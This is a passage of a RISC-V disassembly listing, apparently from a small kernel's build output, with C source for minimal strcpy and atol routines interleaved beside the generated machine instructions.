    8000267a:	fef44783          	lbu	a5,-17(s0)
    8000267e:	0007871b          	sext.w	a4,a5
    80002682:	fee44783          	lbu	a5,-18(s0)
    80002686:	2781                	sext.w	a5,a5
    80002688:	40f707bb          	subw	a5,a4,a5
    8000268c:	2781                	sext.w	a5,a5
}
    8000268e:	853e                	mv	a0,a5
    80002690:	7422                	ld	s0,40(sp)
    80002692:	6145                	addi	sp,sp,48
    80002694:	8082                	ret

0000000080002696 <strcpy>:

char* strcpy(char* dest, const char* src)
{
    80002696:	7179                	addi	sp,sp,-48
    80002698:	f422                	sd	s0,40(sp)
    8000269a:	1800                	addi	s0,sp,48
    8000269c:	fca43c23          	sd	a0,-40(s0)
    800026a0:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800026a4:	fd843783          	ld	a5,-40(s0)
    800026a8:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    800026ac:	0001                	nop
    800026ae:	fd043703          	ld	a4,-48(s0)
    800026b2:	00170793          	addi	a5,a4,1
    800026b6:	fcf43823          	sd	a5,-48(s0)
    800026ba:	fe843783          	ld	a5,-24(s0)
    800026be:	00178693          	addi	a3,a5,1
    800026c2:	fed43423          	sd	a3,-24(s0)
    800026c6:	00074703          	lbu	a4,0(a4)
    800026ca:	00e78023          	sb	a4,0(a5)
    800026ce:	0007c783          	lbu	a5,0(a5)
    800026d2:	fff1                	bnez	a5,800026ae <strcpy+0x18>
    ;
  return dest;
    800026d4:	fd843783          	ld	a5,-40(s0)
}
    800026d8:	853e                	mv	a0,a5
    800026da:	7422                	ld	s0,40(sp)
    800026dc:	6145                	addi	sp,sp,48
    800026de:	8082                	ret

00000000800026e0 <atol>:

long atol(const char* str)
{
    800026e0:	7179                	addi	sp,sp,-48
    800026e2:	f422                	sd	s0,40(sp)
    800026e4:	1800                	addi	s0,sp,48
    800026e6:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    800026ea:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    800026ee:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    800026f2:	a031                	j	800026fe <atol+0x1e>
    str++;
    800026f4:	fd843783          	ld	a5,-40(s0)
    800026f8:	0785                	addi	a5,a5,1
    800026fa:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    800026fe:	fd843783          	ld	a5,-40(s0)
    80002702:	0007c783          	lbu	a5,0(a5)
    80002706:	873e                	mv	a4,a5
    80002708:	02000793          	li	a5,32
    8000270c:	fef704e3          	beq	a4,a5,800026f4 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002710:	fd843783          	ld	a5,-40(s0)
    80002714:	0007c783          	lbu	a5,0(a5)
    80002718:	873e                	mv	a4,a5
    8000271a:	02d00793          	li	a5,45
    8000271e:	00f70b63          	beq	a4,a5,80002734 <atol+0x54>
    80002722:	fd843783          	ld	a5,-40(s0)
    80002726:	0007c783          	lbu	a5,0(a5)
    8000272a:	873e                	mv	a4,a5
    8000272c:	02b00793          	li	a5,43
    80002730:	06f71263          	bne	a4,a5,80002794 <atol+0xb4>
    sign = *str == '-';
    80002734:	fd843783          	ld	a5,-40(s0)
    80002738:	0007c783          	lbu	a5,0(a5)
    8000273c:	0007871b          	sext.w	a4,a5
    80002740:	02d00793          	li	a5,45
    80002744:	40f707b3          	sub	a5,a4,a5
    80002748:	0017b793          	seqz	a5,a5
    8000274c:	0ff7f793          	andi	a5,a5,255
    80002750:	fef42223          	sw	a5,-28(s0)
    str++;
    80002754:	fd843783          	ld	a5,-40(s0)
    80002758:	0785                	addi	a5,a5,1
    8000275a:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    8000275e:	a81d                	j	80002794 <atol+0xb4>
    res *= 10;
    80002760:	fe843703          	ld	a4,-24(s0)
    80002764:	87ba                	mv	a5,a4
    80002766:	078a                	slli	a5,a5,0x2
    80002768:	97ba                	add	a5,a5,a4
    8000276a:	0786                	slli	a5,a5,0x1
    8000276c:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    80002770:	fd843783          	ld	a5,-40(s0)
    80002774:	00178713          	addi	a4,a5,1
    80002778:	fce43c23          	sd	a4,-40(s0)
    8000277c:	0007c783          	lbu	a5,0(a5)
    80002780:	2781                	sext.w	a5,a5
    80002782:	fd07879b          	addiw	a5,a5,-48
    80002786:	2781                	sext.w	a5,a5
    80002788:	873e                	mv	a4,a5
    8000278a:	fe843783          	ld	a5,-24(s0)
    8000278e:	97ba                	add	a5,a5,a4
    80002790:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    80002794:	fd843783          	ld	a5,-40(s0)
    80002798:	0007c783          	lbu	a5,0(a5)
    8000279c:	f3f1                	bnez	a5,80002760 <atol+0x80>
  }

  return sign ? -res : res;
    8000279e:	fe442783          	lw	a5,-28(s0)
    800027a2:	2781                	sext.w	a5,a5
    800027a4:	c791                	beqz	a5,800027b0 <atol+0xd0>
    800027a6:	fe843783          	ld	a5,-24(s0)
    800027aa:	40f007b3          	neg	a5,a5
    800027ae:	a019                	j	800027b4 <atol+0xd4>
    800027b0:	fe843783          	ld	a5,-24(s0)
}
    800027b4:	853e                	mv	a0,a5
    800027b6:	7422                	ld	s0,40(sp)
    800027b8:	6145                	addi	sp,sp,48
    800027ba:	8082                	ret
